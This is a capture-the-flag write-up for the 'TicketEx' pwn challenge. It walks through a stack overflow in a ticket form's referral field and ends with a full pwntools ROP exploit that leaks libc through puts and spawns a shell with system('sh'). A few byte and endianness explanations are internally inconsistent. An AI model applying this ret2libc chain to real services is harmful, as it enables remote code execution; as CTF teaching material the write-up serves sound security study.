# TicketEx — PWN Writeup (BCS CTF)

**Flag:** `bcsctf{95aa455f7e8d0ba598406fc8f5c50ee5}`

**Author:** AB Bishal · Medium challenge from BCS CTF

**Remote:**
- Primary: `172.16.38.21:7778`
- Mirror:  `172.16.38.22:7778`

---

## 1. Recon

```
$ file ticketex
ticketex: ELF 64-bit LSB executable, x86-64, dynamically linked,
         for GNU/Linux 2.6.32, not stripped

$ checksec --file=ticketex
    Arch:       amd64-64-little
    RELRO:      Partial RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x400000)
    Stripped:   No
```

Key protections:

| Flag        | Value          | Impact                                  |
|-------------|----------------|-----------------------------------------|
| PIE         | disabled       | Binary at fixed base → static ROP       |
| Stack canary| disabled       | Free RIP control via overflow           |
| NX          | enabled        | No shellcode → must use ROP             |
| RELRO       | partial        | GOT is writable (handy, but unused here)|

The binary prints a tiny "ticket shop" menu:

```
1. Admin Login
2. Apply for Ticket
3. Check Status
4. Exit
```

`Apply for Ticket` reads five fields — *name, email, origin, destination,
referral* — with `fgets(buf, 0x40, stdin)`.

---

## 2. Static analysis

The interesting function is `ticket_purchase()` (0x400bde). It
allocates a 0x160-byte frame with a 0x158-byte struct at `[rbp-0x160]`,
then reads five fields via `fgets(&local + offset, 0x40, stdin)`:

| Field       | Offset | Size (max) |
|-------------|--------|------------|
| name        | 0x08   | 0x40       |
| email       | 0x48   | 0x40       |
| origin      | 0x88   | 0x40       |
| destination | 0xc8   | 0x40       |
| referral    | 0x148  | **0x40**   |

The struct is exactly 0x158 bytes. **`referral` is at offset 0x148,
so the `fgets` writes up to 63 bytes starting at offset 0x148 — i.e.
16 bytes past the end of the struct, straight onto the saved RBP and
return address of `ticket_purchase`.**

Layout on the stack after `fgets`:

```
[rbp-0x18]  fgets starts writing here   <- struct[0x148]  (referral[0])
[rbp-0x10]  struct[0x150] (function ptr — zeroed by code)
[rbp-0x08]  above struct
[rbp+0x00]  SAVED RBP
[rbp+0x08]  RETURN ADDRESS               <- ROP starts here
[rbp+0x10]  …                            <- rest of ROP chain
```

The code zeros `[rbp-0x10]` (the `func_ptr` field of the local
struct) **after** `fgets`, but that's fine — we don't care about
`func_ptr`, we control the return address.

### Useful gadgets (in the binary itself)

| Address    | Effect                              |
|------------|-------------------------------------|
| `0x401003` | `pop rdi ; ret`                     |
| `0x401001` | `pop rsi ; pop r15 ; ret`           |
| `0x4006f9` | `ret` (useful for 16-byte alignment)|
| `0x400ffa` | `pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret` |
| `0x400720` | `puts@plt`                          |
| `0x602020` | `puts@got`                          |
| `0x400e76` | `main`                              |
| `0x4008d6` | `grant_free_ticket`                 |

---

## 3. The constraint

`fgets(buf, 0x40, stdin)` reads **at most 63 bytes** (size-1) — it
does *not* read a 64th. The first 32 bytes of input reach the return
address, so we have **31 bytes of ROP** (with a trailing `fgets`
null-pad at byte 63).

For a `pop rdi ; ret → arg → func → next` chain we need 32 bytes.
The trick is that **every address we control ends in `0x00`** — so we
just *send 31 bytes of ROP and let `fgets` write the `0x00` for us*.
This works as long as the high byte of the last address is already
`0x00`.

---

## 4. Exploitation

### Stage 1 — leak libc

```
padding (32 bytes) + pop_rdi + puts@GOT + puts@PLT + main_addr
```

The `main_addr` `0x400e76` already ends in `0x00`, so we drop that
last byte from the payload — `fgets` writes it back as its trailing
null.

After the function returns, the ROP chain prints the libc address of
`puts`, then re-enters `main`.

### Stage 2 — spawn a shell

After the leak we know the libc base. We ROP again, but this time we
need only 24 bytes (3 qwords):

```
padding (32 bytes) + pop_rdi + "sh" + system
```

We use the pre-existing `sh\0` string inside libc (offset `0x11e70`
in `libc6_2.23-0ubuntu11.2_amd64`) instead of `"/bin/sh"` (offset
`0x18ce17`) — it saves bytes (the chain fits comfortably) and gives
us a fully interactive shell because `system("sh")` runs `/bin/sh -c
sh`, and the spawned `sh` inherits stdin/stdout.

### Why not `/bin/sh`?

`/bin/sh` works too, but the chain becomes 32 bytes (4 qwords) and
the high byte of `system` is `0xa0`, not `0x00`. `fgets`'s trailing
null pad at byte 63 would corrupt `system`'s low byte to `0x00` and
the program would crash before we could interact with the shell.
Using `"sh"` keeps everything inside the safe 56-byte region.

---

## 5. Libc identification

We leaked `puts` and observed its low 12 bits are `0x6a0`. Looking
that up against libc-database:

```
libc6_2.23-0ubuntu11.2_amd64   buildid c4fd86ec1eed57a09c79ce601f6c6e3796f574df
    puts     = 0x6f6a0
    system   = 0x453a0
    /bin/sh  = 0x18ce17
    "sh"     = 0x11e70
```

The downloaded `libc.so` matches and is used by the exploit for
offsets.

---

## 6. Final exploit

```python
#!/usr/bin/env python3
from pwn import *
import time

context.log_level = 'info'
context.arch = 'amd64'

HOST = '172.16.38.21'
PORT = 7778

libc = ELF('./libc.so')

pop_rdi   = 0x401003
puts_plt  = 0x400720
puts_got  = 0x602020
main_addr = 0x400e76

puts_off   = libc.symbols['puts']
system_off = libc.symbols['system']
sh_off     = next(libc.search(b'sh\x00'))


def apply_ticket(p, name, email, origin, dest, referral):
    p.recvuntil(b'> ')
    p.sendline(b'2')
    p.recvuntil(b'Enter your name: ')
    p.sendline(name)
    p.recvuntil(b'Enter your email: ')
    p.sendline(email)
    p.recvuntil(b'Enter origin Country Name: ')
    p.sendline(origin)
    p.recvuntil(b'Enter destination Country Name: ')
    p.sendline(dest)
    p.recvuntil(b'Enter referral code (if any): ')
    p.sendline(referral)


def exploit():
    p = remote(HOST, PORT)

    # Stage 1: leak puts@libc and return to main
    rop1  = b'A'*8 + b'B'*8 + b'C'*8 + p64(0xdeadbeef)
    rop1 += p64(pop_rdi) + p64(puts_got) + p64(puts_plt)
    rop1 += p64(main_addr)[:-1]    # drop last 0x00; fgets writes it back
    assert len(rop1) == 63
    apply_ticket(p, b'u1', b'a@a.com', b'X', b'Y', rop1)

    p.recvuntil(b'You can refer your friends')
    p.recvline()
    leak = p.recvline()
    libc_puts = u64(leak.strip().ljust(8, b'\x00'))
    libc_base = libc_puts - puts_off
    system_addr = libc_base + system_off
    sh_addr     = libc_base + sh_off
    log.success(f'libc_base = {hex(libc_base)}')

    # Stage 2: system("sh")
    rop2  = b'C'*16 + b'D'*8 + p64(0xcafebabe)
    rop2 += p64(pop_rdi) + p64(sh_addr) + p64(system_addr)
    assert len(rop2) == 56
    apply_ticket(p, b'u2', b'b@b.com', b'X', b'Y', rop2)

    time.sleep(1)
    p.recvuntil(b'You can refer your friends', timeout=3)
    p.recvline()

    p.sendline(b'echo HELLO_SHELL')
    p.sendline(b'cat flag.txt 2>/dev/null')
    time.sleep(1)
    print(p.recv(timeout=5).decode('latin1', errors='replace'))
    p.close()


if __name__ == '__main__':
    exploit()
```

### Output

```
[+] libc_base = 0x773c35ab6000
HELLO_SHELL
bcsctf{95aa455f7e8d0ba598406fc8f5c50ee5}
```

---

## 7. Lessons / takeaways

* **Always compute the offset from the `fgets` start to the return
  address very carefully.**  In this binary the offset was `0x20`,
  which left only 31 bytes of usable ROP after the prefix.
* **`fgets`'s trailing null can help or hurt you.**  It helps when
  the high byte of your final address is already `0x00` (you can
  truncate your payload).  It hurts when the final address's low
  byte carries information that gets zeroed.
* **Reuse existing strings in libc.**  `system("sh")` is two
  qwords shorter than `system("/bin/sh")` and is just as effective
  for spawning an interactive shell.
* **The dead `func_ptr` field in the application struct is a red
  herring.**  The code zeros it before copying the struct into BSS,
  and `check_status`'s `call [func_ptr]` is therefore unreachable
  through any normal input path.  The intended vulnerability is the
  simple stack overflow.
